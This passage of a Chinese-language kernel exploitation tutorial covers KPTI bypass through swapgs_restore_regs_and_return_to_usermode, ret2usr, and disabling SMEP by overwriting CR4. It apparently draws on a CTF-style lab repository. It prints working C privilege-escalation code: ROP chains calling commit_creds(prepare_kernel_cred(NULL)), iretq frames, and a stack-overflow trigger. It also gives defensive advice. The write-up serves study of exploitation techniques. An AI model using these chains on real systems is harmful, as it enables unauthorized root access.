│ 11 ... 0                 │ 标志位 (Flags)                                                 │
└─────────────┴────────────────────────────────┘

页表切换机制:
- CR3[12]=0 → 使用内核页表 (PGD Kernel at CR3)
- CR3[12]=1 → 使用用户页表 (PGD User at CR3+0x1000)
```

### 6-2. 引入KPTI后的变化与挑战

对于内核漏洞利用，KPTI的引入带来了一个关键变化：

**传统ROP链的崩溃问题**：
传统的内核ROP链在`iretq`之后会立即崩溃。因为在传统的利用链末尾，通常通过`swapgs; iretq`（或类似的简短gadget序列）直接返回用户态。`iretq`指令虽然会将CPU特权级从0（内核态）切换到3（用户态），但它**不会自动切换`CR3`寄存器**。

这意味着CPU在用户态下，仍在使用的是一套能"看到"内核空间的内核态页表。然而，由于KPTI，用户态代码此时使用的页表正是那个无法访问内核地址的"用户态页表"。因此，当CPU试图从`iretq`返回后执行下一条指令（该指令地址位于内核ROP链中，其地址属于内核空间）时，会因为页表映射缺失而产生缺页异常，导致程序崩溃。

```
传统模式地址空间:
┌─────────────────────────────────────────────┐
│              用户空间 (User Space)                                                       │
│  0x0000000000000000 ~ 0x00007FFFFFFFFFFF                                                 │
├─────────────────────────────────────────────┤
│              内核空间 (Kernel Space)                                                     │
│  0xFFFF800000000000 ~ 0xFFFFFFFFFFFFFFFF                                                 │
└─────────────────────────────────────────────┘

KPTI模式地址空间:

用户态 (User Mode):
┌─────────────────────────────────────────────┐
│              用户空间 (User Space)                                                       │
│  0x0000000000000000 ~ 0x00007FFFFFFFFFFF                                                 │
├─────────────────────────────────────────────┤
│         内核空间 (受限映射)                                                              │
│  仅保留必要的入口点                                                                      │
└─────────────────────────────────────────────┘

内核态 (Kernel Mode):
┌─────────────────────────────────────────────┐
│              用户空间 (User Space)                                                       │
│  0x0000000000000000 ~ 0x00007FFFFFFFFFFF                                                 │
├─────────────────────────────────────────────┤
│              内核空间 (Kernel Space)                                                     │
│  0xFFFF800000000000 ~ 0xFFFFFFFFFFFFFFFF                                                 │
└─────────────────────────────────────────────┘
```

**传统ROP链失败原因**：
```
传统ROP链执行流程:

[内核态执行ROP链]
    ↓
执行 iretq 指令
    ↓
CPU切换到用户态 (CPL=3)
    ↓
尝试访问用户态代码
    ↓
❌ 页表错误 (Page Fault)
(仍在使用内核页表，但用户页表未激活)
```

### 6-3. 绕过KPTI方案

最稳定可靠的绕过方法是**复用内核自身用于从系统调用/中断返回用户的完整退出代码**。Linux内核提供了一个高度优化的、用于处理KPTI的返回路径。利用的目标就是在ROP链的最后，跳转到这段代码，而不是简单的`iretq` gadget。

**使用 `swapgs_restore_regs_and_return_to_usermode` 绕过KPTI**，这是一个内核符号（或由其代表的一系列指令序列），它封装了从内核态安全返回用户态所需的所有操作。其工作流程通常包括：

1.  **保存剩余寄存器**：将尚未保存的通用寄存器值保存到栈上。
2.  **切换至用户态页表**：执行`mov cr3, rdi`之类的指令，将`CR3`寄存器设置为当前进程的"用户态页表"基址。
3.  **执行`swapgs`**：切换GS段基址，从内核的`KERNEL_GSBASE`切换到用户的`GSBASE`。
4.  **恢复寄存器**：从栈上恢复所有通用寄存器的值。
5.  **执行`iretq`**：安全地返回用户态。此时，由于页表已提前切换，CPU在用户态下使用的是正确的、不包含内核映射的页表，因此能够无缝地继续执行用户空间代码。

### 6-4. 在ROP链中的整合

在实际构建ROP链时，对`swapgs_restore_regs_and_return_to_usermode`函数的整合是绕过KPTI的核心步骤。其实战布局与内核退出路径的预期栈帧结构紧密相关。以下结合典型代码片段进行具体说明：

```c
// commit_creds(prepare_kernel_cred(NULL));
rop_chain[i++] = kernel_offset + POP_RDI_RET;
rop_chain[i++] = 0;
rop_chain[i++] = kernel_offset + PREPARE_KERNEL_CRED;
rop_chain[i++] = kernel_offset + POP_RCX_RET;
rop_chain[i++] = 0;
rop_chain[i++] = kernel_offset + POP_RSI_RET;
rop_chain[i++] = 0;
rop_chain[i++] = kernel_offset + CMP_RCX_RSI_MOV_RDI_RAX_POP_RBP_RET;
rop_chain[i++] = 0;
rop_chain[i++] = kernel_offset + COMMIT_CREDS;
rop_chain[i++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x22;
rop_chain[i++] = *(size_t *)"BinRacer";  // pop    rax
rop_chain[i++] = *(size_t *)"BinRacer";  // pop    rdi
rop_chain[i++] = (size_t)get_root_shell; // 用户态RIP
rop_chain[i++] = user_cs;               // 用户态CS
rop_chain[i++] = user_rflags;           // 用户态RFLAGS
rop_chain[i++] = user_sp + 8;           // 用户态RSP (调整后)
rop_chain[i++] = user_ss;               // 用户态SS
```

**布局解析与操作逻辑**

1.  **跳转地址与偏移（`+0x22`）**：
    控制流被导向`swapgs_restore_regs_and_return_to_usermode + 0x22`的地址。此偏移（具体值依内核版本而定）旨在跳过函数序言中与ROP上下文不兼容的寄存器保存等操作，直接进入执行`swapgs`、切换`CR3`（页表）和准备`iretq`的核心代码段。该偏移后的代码期望栈顶已按特定结构布局。

2.  **寄存器恢复占位符（两个`"BinRacer"`）**：
    在跳转地址之后，立即放置了两个8字节的值（此处用字符串`"BinRacer"`的字面量填充）。这对应于内核退出路径代码期望从栈中弹出并恢复到**RAX**和**RDI**寄存器的值。在ROP利用场景下，这些通用寄存器的具体值通常不重要（除非后续代码依赖它们），因此常用任意固定值填充。

3.  **用户态上下文帧（IRET帧）**：
    紧随其后的是5个8字节值，共同构成了`iretq`指令所需弹出的完整上下文，其顺序必须严格符合CPU规范：
    *   **`user_rip`** (`get_root_shell`)：控制流返回用户态后执行的第一条指令地址，通常指向获取shell的代码。
    *   **`user_cs`**：用户态代码段选择子。
    *   **`user_rflags`**：标志寄存器状态，需保持与陷入内核前一致（如中断使能位）。
    *   **`user_sp`** (`user_sp + 8`)：返回用户态后的栈指针。这里`+8`的调整很常见，可能用于补偿栈上因跳转而发生的额外变化，或对齐特定的栈布局，需根据实际利用动态确定。
    *   **`user_ss`**：用户态栈段选择子。

### 6-5. 执行流程

当控制流到达`swapgs_restore_regs_and_return_to_usermode+0x22`时，后续的代码会：
1.  从内核数据结构（例如通过`RDI`或栈上预设位置）加载用户态页表的基址到`CR3`寄存器，完成页表切换。
2.  按顺序从栈中弹出值到RAX、RDI。
3.  执行`swapgs`指令，切换GS段基址。
4.  最终执行`iretq`指令。该指令会从当前栈顶（此时正好指向`user_rip`）依次弹出5个值到`RIP`、`CS`、`RFLAGS`、`RSP`、`SS`寄存器，从而完成特权级切换并跳转到`get_root_shell`执行。

**KPTI工作流程**：
```
系统调用流程 (启用KPTI):

用户态 → 内核态:
1. 用户程序发起系统调用
2. CPU切换到内核态 (CPL=0)
3. 硬件自动切换CR3[12]=0
4. 使用完整的内核页表
5. 执行内核代码

内核态 → 用户态:
1. 内核处理完成
2. 准备返回用户态
3. 切换CR3[12]=1
4. 使用受限的用户页表
5. 执行IRET指令返回用户态
```

**正确返回路径**：
```
正确返回路径:

[内核态执行ROP链]
    ↓
跳转到 swapgs_restore_regs_and_return_to_usermode + 0x22
    ↓
切换CR3寄存器 (页表切换)
    ↓
执行 swapgs 指令
    ↓
执行 iretq 指令
    ↓
✅ 成功返回用户态
(已切换到正确的用户页表)
```

### 6-6. 总结

通过这种精心的栈帧构造，ROP链"欺骗"内核的官方退出路径，使其在完成权限提升后，以为自己是处理一次普通的中断/系统调用返回，从而自动、正确地为目标进程执行了KPTI所要求的页表切换（`CR3`更新）和完整的上下文恢复。这是当前内核漏洞利用中，兼顾可靠性与兼容性，绕过KPTI防护并稳定返回用户态的标准方法。


## 7. 进阶分析：ret2usr技术

### 7-1. ret2usr技术原理

**ret2usr**是内核漏洞利用中的一种经典技术，其核心思想是：在获得内核控制流后，**不通过复杂的内核ROP链，而是直接跳转到用户空间预先布置的shellcode执行权限提升代码**。这种技术在硬件保护机制不完善的时代极为常见，因其实现简单、稳定可靠。

#### 7-1-1. 技术工作流程

```
用户态准备阶段:
1. 在用户空间分配可执行内存
2. 布置获取root权限的shellcode
3. 泄露shellcode的内存地址

内核劫持阶段:
1. 触发内核漏洞，控制程序执行流
2. 将返回地址覆盖为shellcode地址
3. 内核执行"ret"指令，跳转到用户空间shellcode
4. shellcode执行权限提升操作
5. 获取root shell
```

#### 7-1-2. ret2usr利用实现

利用的核心是在用户空间构造一个函数，该函数直接调用内核函数`commit_creds(prepare_kernel_cred(NULL))`，然后通过`iretq`安全返回用户态：

```c
// 用户空间ret2usr利用代码
void *(*prepare_kernel_cred_kfunc)(void *task_struct);
int (*commit_creds_kfunc)(void *cred);

void ret2usr_exploit(void) {
  // 设置内核函数指针
  prepare_kernel_cred_kfunc = (void *(*)(void *))prepare_kernel_cred;
  commit_creds_kfunc = (int (*)(void *))commit_creds;
  
  // 执行权限提升：commit_creds(prepare_kernel_cred(NULL))
  (*commit_creds_kfunc)((*prepare_kernel_cred_kfunc)(NULL));

  // 通过iretq安全返回用户态
  asm volatile(
    "mov rax, user_ss;"
    "push rax;"                    // SS
    "mov rax, user_sp;"
    "sub rax, 8;"                  // 栈平衡调整
    "push rax;"                    // RSP
    "mov rax, user_rflags;"
    "push rax;"                    // RFLAGS
    "mov rax, user_cs;"
    "push rax;"                    // CS
    "lea rax, get_root_shell;"
    "push rax;"                    // RIP
    "swapgs;"                      // 切换GS段
    "iretq;"                       // 返回用户态
  );
}
```

#### 7-1-3. 漏洞触发主程序

```c
int main() {
  ...
  // 构造栈布局，填充正确的canary
  for (i = 0; i < 10; i++) {
    rop_chain[i] = canary;
  }
  
  // 设置返回地址为ret2usr_exploit函数
  rop_chain[i++] = (size_t)ret2usr_exploit;
  
  // 写入利用载荷
  write(fd, rop_chain, 0x800);
  
  // 触发漏洞：整数溢出导致栈溢出
  core_copy_func(fd, (0xffffffffffff0000 | 0x100));
  return 0;
}
```

#### 7-1-4. ret2usr的优势

- **实现简单**：无需构建复杂的ROP链，直接调用内核函数
- **稳定性高**：完全控制执行流程，可进行精确的上下文恢复
- **开发快速**：适合快速原型验证和教学演示

#### 7-1-5. ret2usr的局限

仅在**SMEP保护未启用**的环境下有效。SMEP会检测内核态执行用户空间代码的企图，触发页错误，导致进程终止。因此，在现代启用了SMEP的系统上，此技术无法直接使用。

### 7-2. ret2usr的技术细节分析

#### 7-2-1. 用户空间shellcode构造

1. **函数指针转换**：
   ```c
   // 将内核函数地址转换为用户空间函数指针
   prepare_kernel_cred_kfunc = (void *(*)(void *))prepare_kernel_cred;
   commit_creds_kfunc = (int (*)(void *))commit_creds;
   ```
   这里假设已通过信息泄露获取了内核函数的实际地址。

2. **权限提升调用**：
   ```c
   (*commit_creds_kfunc)((*prepare_kernel_cred_kfunc)(NULL));
   ```
   直接调用内核函数完成权限提升，这是ret2usr技术的核心优势。

3. **安全返回用户态**：
   ```assembly
   ; 构造完整的iretq帧
   mov rax, user_ss
   push rax      ; SS
   mov rax, user_sp
   sub rax, 8    ; 栈平衡调整
   push rax      ; RSP
   mov rax, user_rflags
   push rax      ; RFLAGS
   mov rax, user_cs
   push rax      ; CS
   lea rax, get_root_shell
   push rax      ; RIP
   swapgs        ; 切换GS段
   iretq         ; 返回用户态
   ```
   完整的`iretq`帧确保从内核态安全返回用户态。

#### 7-2-2. 栈布局构造

```
低地址
+-----------------------+
|  溢出填充数据         |  // 填充至canary前
+-----------------------+
|   正确的Canary值      |  // 偏移0x40处
+-----------------------+
|   伪造的RBP值         |  // 可忽略
+-----------------------+
|   ret2usr_exploit地址 |  // 控制流劫持点
+-----------------------+
高地址
```

#### 7-2-3. 工作流程

1. 触发整数溢出漏洞，向栈缓冲区写入大量数据
2. 覆盖返回地址为`ret2usr_exploit`函数地址
3. 函数返回时跳转到用户空间shellcode
4. shellcode调用内核函数完成权限提升
5. 通过`swapgs; iretq`安全返回用户态
6. 执行`get_root_shell`获取root权限

### 7-3. ret2usr的现代适用性与技术演进

#### 7-3-1. 现代适用场景

随着硬件保护机制的普及，纯ret2usr技术已基本失效，但在特定场景仍有价值：

1. **嵌入式/IoT设备**：部分低功耗设备为性能考虑未启用SMEP/SMAP
2. **旧系统兼容**：早期Linux内核（4.x之前）或特殊配置的系统
3. **教学与研究**：作为理解内核漏洞利用原理的起点
4. **虚拟机环境**：某些虚拟化配置可能禁用硬件保护
5. **组合利用**：作为复杂利用链的组成部分

#### 7-3-2. 技术演进路径

```
技术演进脉络:

ret2usr (古典时代)
│
├── 绕过Stack Canary (信息泄露)
│
├── 绕过KASLR (内核地址泄露)
│
├── SMEP引入 (硬件保护)
│
├── ROP技术 (绕过SMEP)
│
├── SMAP引入 (数据访问保护)
│
├── 纯内核ROP (绕过SMAP)
│
├── KPTI引入 (页表隔离)
│
└── 现代完整利用链
```

**各阶段技术特点**：

1. **古典ret2usr**：
   - 直接跳转用户空间
   - 简单、稳定
   - 无硬件保护干扰

2. **信息泄露时代**：
   - 需要泄露canary绕过栈保护
   - 需要泄露内核地址绕过KASLR
   - 利用复杂度增加

3. **ROP技术时代**：
   - SMEP强制使用纯内核ROP
   - 需要寻找合适的gadget
   - 利用链复杂度显著增加

4. **现代利用链**：
   - 多重硬件保护机制
   - 需要串联多个漏洞
   - 复杂的上下文保存与恢复

#### 7-3-3. 技术价值与教学意义

尽管ret2usr在现代系统中已难直接应用，但其教学价值不容忽视：

1. **控制流劫持基础**：理解从内核空间到用户空间的跳转原理
2. **权限提升模型**：掌握`commit_creds(prepare_kernel_cred(0))`的标准调用方式
3. **上下文保存恢复**：学习`iretq`返回用户态的完整流程
4. **硬件保护演进**：理解SMEP/SMAP等保护机制的必要性
5. **利用技术发展**：从简单到复杂的漏洞利用技术演进路径

### 7-4. 测试结果

<div style="text-align: center; margin: 2rem 0;">
  <img src="/images/posts/KernelExploit/ROP/ret2usr_001.png"
       style="border-radius: 12px; 
              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
              max-width: 100%;
              height: auto;">
</div>

### 7-5. 总结

ret2usr技术代表了内核漏洞利用的"古典时代"——那个硬件保护机制尚未普及、利用技术相对直接的时期。随着SMEP、SMAP、KPTI等硬件保护机制的引入，ret2usr技术逐渐被更复杂的ROP技术取代。

然而，ret2usr技术的历史价值和教育意义依然重要：

1. **简化理解**：通过ret2usr可以直观理解内核漏洞利用的核心原理
2. **技术基础**：现代ROP技术是在ret2usr基础上的演进和发展
3. **安全演进**：展示了安全领域"利用-防御-再利用"的螺旋式发展
4. **实战参考**：在特定环境（如旧系统、嵌入式设备）中仍有参考价值

理解ret2usr技术，不仅是学习一段技术历史，更是理解现代内核安全防护体系演进的重要基础。

## 8. 进阶分析：SMEP/SMAP保护机制及其绕过

### 8-1. SMEP保护机制详解

**SMEP**旨在防止内核态执行用户空间代码，是ret2usr技术的**直接克星**。

```
SMEP (Supervisor Mode Execution Protection) 原理:

CPU保护机制:
┌────────────────────────────────────┐
│          CR4寄存器控制位                                               │ 
├────────────────────────────────────┤
│  CR4[20] = SMEP位 (1=启用, 0=禁用)                                     │
└────────────────────────────────────┘

保护逻辑:
1. 当CPU处于内核态 (CPL=0) 时
2. 尝试执行用户空间 (页表项U/S=1) 的代码
3. CPU检查CR4寄存器的SMEP位
4. 如果SMEP=1，则触发#PF异常 (Page Fault)
5. 内核处理异常，通常导致进程终止

技术影响:
- 完全阻止ret2usr利用
- 强制使用纯内核ROP
```

**SMEP的硬件实现**：
SMEP通过在页表项中检查**U/S位**（User/Supervisor位）来实现保护：
- 用户空间页表的页表项U/S=1
- 内核空间页表的页表项U/S=0
- 当CPU在内核态尝试执行U/S=1的页面时，SMEP会触发页错误

### 8-2. SMAP保护机制详解

**SMAP**是对SMEP的补充，防止内核态**访问**用户空间数据。

```
SMAP (Supervisor Mode Access Prevention) 原理:

CPU保护机制:
┌────────────────────────────────────┐
│          CR4寄存器控制位                                               │
├────────────────────────────────────┤
│  CR4[21] = SMAP位 (1=启用, 0=禁用)                                     │
└────────────────────────────────────┘

保护逻辑:
1. 当CPU处于内核态 (CPL=0) 时
2. 尝试访问用户空间 (页表项U/S=1) 的数据
3. CPU检查CR4寄存器的SMAP位
4. 如果SMAP=1，则触发#PF异常
5. 内核处理异常，通常导致进程终止

技术影响:
- 阻止内核ROP链访问用户空间数据
- 包括从用户空间读取参数
- 必须使用纯内核数据
```

**SMAP的硬件实现**：
与SMEP类似，SMAP也通过检查页表项的U/S位实现。区别在于：
- SMEP保护**执行**（指令获取）
- SMAP保护**数据访问**（读/写操作）

### 8-3. 硬件保护的协同作用

现代系统通常同时启用多种硬件保护机制，形成纵深防御：

```
保护机制堆栈:

┌────────────────────────────────────┐
│        KPTI (页表隔离)                                                 │
│  - 隔离用户/内核地址空间映射                                           │
├────────────────────────────────────┤
│        SMEP (执行保护)                                                 │
│  - 阻止内核执行用户代码                                                │
├────────────────────────────────────┤
│        SMAP (访问保护)                                                 │
│  - 阻止内核访问用户数据                                                │
├────────────────────────────────────┤
│        KASLR (地址随机化)                                              │
│  - 随机化内核代码/数据地址                                             │
├────────────────────────────────────┤
│        Stack Canary (栈保护)                                           │
│  - 检测栈缓冲区溢出                                                    │
└────────────────────────────────────┘
```

**对利用技术的综合影响**：
1. **KASLR**：增加信息泄露需求，需先泄露内核地址
2. **Stack Canary**：需先泄露canary值
3. **SMEP**：禁止直接跳转到用户空间shellcode
4. **SMAP**：禁止ROP链使用用户空间数据
5. **KPTI**：需正确处理页表切换才能返回用户态

### 8-4. 绕过SMEP/SMAP的技术

**绕过SMEP**：**ROP技术**
- 通过在内核空间中寻找gadget，构建完整的ROP链
- 所有代码执行都在内核空间完成
- 无需执行用户空间代码

**绕过SMAP**：**纯内核数据ROP**
- 所有ROP链参数必须来自内核空间
- 可使用内核全局变量、常量等作为参数
- 或通过内核函数间接获取数据

**现代利用链特点**：
1. **信息泄露先行**：必须首先泄露内核地址和canary
2. **纯内核ROP**：所有gadget必须来自内核空间
3. **自包含数据**：ROP链参数必须来自内核空间
4. **完整上下文恢复**：必须正确处理KPTI的页表切换

**结合ROP绕过SMEP/SMAP的ret2usr技术**：

在SMEP/SMAP启用环境下，虽然无法直接执行用户空间代码，但可以通过**ROP链修改CR4寄存器**临时关闭SMEP保护，然后再执行ret2usr。以下是典型实现：

```c
// 用户空间ret2usr利用代码
void *(*prepare_kernel_cred_kfunc)(void *task_struct);
int (*commit_creds_kfunc)(void *cred);

void ret2usr_exploit(void) {
  // 设置内核函数指针
  prepare_kernel_cred_kfunc = (void *(*)(void *))prepare_kernel_cred;
  commit_creds_kfunc = (int (*)(void *))commit_creds;
  
  // 执行权限提升：commit_creds(prepare_kernel_cred(NULL))
  (*commit_creds_kfunc)((*prepare_kernel_cred_kfunc)(NULL));

  // 通过iretq安全返回用户态
  asm volatile(
    "mov rax, user_ss;"
    "push rax;"                    // SS
    "mov rax, user_sp;"
    "sub rax, 8;"                  // 栈平衡调整
    "push rax;"                    // RSP
    "mov rax, user_rflags;"
    "push rax;"                    // RFLAGS
    "mov rax, user_cs;"
    "push rax;"                    // CS
    "lea rax, get_root_shell;"
    "push rax;"                    // RIP
    "swapgs;"                      // 切换GS段
    "iretq;"                       // 返回用户态
  );
}

int main() {
...
  for (i = 0; i < 10; i++) {
    rop_chain[i] = canary;
  }

  // 构建ROP链修改CR4寄存器，关闭SMEP保护
  rop_chain[i++] = kernel_offset + POP_RAX_RET;     // 弹出值到RAX
  rop_chain[i++] = 0x6f0;                           // 要设置的CR4值（关闭SMEP）
  rop_chain[i++] = kernel_offset + MOV_CR4_RAX_PUSH_RCX_POPFQ_POP_RBP_RET;  // 写入CR4
  rop_chain[i++] = 0;                              // 占位
  rop_chain[i++] = (size_t)ret2usr_exploit;        // 跳转到用户空间代码

  write(fd, rop_chain, 0x800);

  core_copy_func(fd, (0xffffffffffff0000 | 0x100));
  return 0;
}
```

**技术要点分析**：

1. **CR4寄存器操作**：
   - 先通过`POP_RAX_RET` gadget将值`0x6f0`加载到RAX寄存器
   - 此值对应CR4寄存器，其中第20位（SMEP位）为0，表示关闭SMEP保护
   - 通过`MOV_CR4_RAX` gadget将RAX值写入CR4寄存器

2. **ROP链流程**：
   - 内核执行流被劫持后，首先执行ROP链
   - ROP链修改CR4寄存器，临时关闭SMEP保护
   - 随后跳转到用户空间的`ret2usr_exploit`函数
   - 此时SMEP已关闭，可以正常执行用户空间代码

3. **安全返回机制**：
   - 用户空间函数完成权限提升后
   - 通过`swapgs; iretq`安全返回用户态
   - 注意：`iretq`前需正确构造栈帧（RIP、CS、RFLAGS、RSP、SS）

**完整利用链示例**：
```
信息泄露 (漏洞一)
    ↓
获取内核地址、canary
    ↓
构建ROP链（包含修改CR4的gadget）
    ↓
触发栈溢出 (漏洞二)
    ↓
执行ROP链，修改CR4关闭SMEP
    ↓
跳转到用户空间ret2usr代码
    ↓
执行权限提升操作
    ↓
安全返回用户态
    ↓
获取root shell
```

### 8-5. 防御建议

1. **始终启用所有硬件保护**：SMEP、SMAP、KPTI
2. **定期更新内核**：修复已知漏洞
3. **最小权限原则**：内核模块应仅具有必要权限
4. **代码审计**：定期审计内核代码，特别是驱动模块
5. **运行时检测**：监控异常的内核行为

**针对ROP修改CR4的防御**：
- 监控CR4寄存器的异常修改
- 使用只读的CR4寄存器位
- 实施控制流完整性保护
- 对敏感寄存器操作进行审计

### 8-6. 总结

**SMEP**和**SMAP**代表了现代CPU硬件安全机制的重要进展，它们从根本上改变了内核漏洞利用的游戏规则：

1. **SMEP**终结了**ret2usr**的简单利用时代，迫使利用转向更复杂的**ROP技术**
2. **SMAP**进一步增加了利用难度，要求ROP链必须**完全自包含**在内核空间
3. 与**KASLR**、**Stack Canary**、**KPTI**等机制协同，形成了**纵深防御体系**

然而，即使是SMEP这样的硬件保护机制，也可以通过精巧的ROP链（如修改CR4寄存器）来临时绕过。如上文示例所示，可以：
- 先通过信息泄露获取内核地址和canary
- 构建包含`MOV_CR4_RAX`等关键gadget的ROP链
- 在ROP链中临时关闭SMEP保护
- 然后安全地执行ret2usr技术

这种"绕过一个保护机制来利用另一个漏洞"的策略，展示了现代内核利用的复杂性。防御方需要构建多层次、相互协同的防御体系，而不仅仅是依赖单一的硬件保护机制。

安全领域始终是"道高一尺，魔高一丈"的持续博弈。硬件保护机制的不断完善，既是对进攻方的挑战，也是对防御者的鞭策，共同推动着整个计算机安全生态的进步与发展。防御方需要不断更新防护策略，包括监控敏感寄存器修改、实施控制流完整性、进行运行时行为分析等，才能有效应对日益精密的利用技术。

## 参考

https://github.com/BinRacer/pwn4kernel/tree/master/src/ROP
https://github.com/BinRacer/pwn4kernel/tree/master/src/ROPwithBypassKPTI
https://github.com/BinRacer/pwn4kernel/tree/master/src/ret2usr
https://github.com/BinRacer/pwn4kernel/tree/master/src/ret2usrBypassSMEPorSMAP
